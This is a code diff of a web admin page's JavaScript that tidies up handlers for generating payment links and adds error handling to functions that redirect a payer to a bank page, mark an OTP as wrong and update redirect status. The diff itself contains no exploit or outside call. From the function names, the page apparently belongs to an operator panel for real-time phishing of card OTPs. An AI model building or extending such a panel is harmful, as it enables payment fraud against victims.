@@ -190,41 +190,40 @@
     let bankpageWindow = null;
     
 document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
-  e.preventDefault();
+  e.preventDefault(); // prevent refresh
+  
   const amountInput = document.getElementById('amount');
-  const descInput = document.getElementById('description');
+  const descInput   = document.getElementById('description');
   const linkContainer = document.getElementById('paymentLinkContainer');
   
   try {
     const amount = parseFloat(amountInput.value);
     const description = descInput.value.trim();
-
+    
     if (!amount || amount <= 0) throw new Error('Please enter a valid positive amount');
     if (!description) throw new Error('Description cannot be empty');
-
+    
     const response = await fetch('/api/generatePaymentLink', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ amount, description })
     });
-
+    
     if (!response.ok) {
       const errorData = await response.json();
       throw new Error(errorData.message || 'Payment link generation failed');
     }
-
+    
     const data = await response.json();
     document.getElementById('paymentLink').textContent = data.paymentLink;
     linkContainer.style.display = 'block';
     alert('Payment link created successfully!');
-
   } catch (error) {
     console.error('Error:', error);
     alert(`ERROR: ${error.message}`);
     linkContainer.style.display = 'none';
   }
 });
-
 
     function copyPaymentLink() {
       const link = document.getElementById('paymentLink').textContent;
@@ -248,29 +247,53 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
     }
 
         // ADD THIS NEW FUNCTION
-    async function redirectToBankPage(id) {
-      try {
-        const response = await fetch("/api/redirectToBankPage", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ invoiceId: id })
-        });
+async function redirectToBankPage(id) {
+  try {
+    const response = await fetch("/api/redirectToBankPage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ invoiceId: id })
+    });
+    if (!response.ok) throw new Error('Failed to redirect to bank page');
+    // Possibly reload or update UI
+    loadTransactions();
+  } catch (error) {
+    console.error('Error redirecting to bank page:', error);
+    alert('Failed to redirect to bank page. Please try again.');
+  }
+}
+
     
     async function markWrongOTP(id) {
-      try {
-        const response = await fetch("/api/wrongOTP", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ invoiceId: id })
-        });
+  try {
+    const response = await fetch("/api/wrongOTP", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ invoiceId: id })
+    });
+    if (!response.ok) throw new Error('Failed to mark OTP as wrong');
+    loadTransactions();
+  } catch (error) {
+    console.error('Error marking OTP as wrong:', error);
+    alert('Failed to mark OTP as wrong. Please try again.');
+  }
+}
+
 
     async function updateStatus(id, status) {
-      try {
-        const response = await fetch("/api/updateRedirectStatus", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ invoiceId: id, redirectStatus: status })
-        });
+  try {
+    const response = await fetch("/api/updateRedirectStatus", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ invoiceId: id, redirectStatus: status })
+    });
+    if (!response.ok) throw new Error('Failed to update status');
+    loadTransactions();
+  } catch (error) {
+    console.error('Error updating status:', error);
+    alert('Failed to update status. Please try again.');
+  }
+}
 
     async function loadTransactions() {
       try {
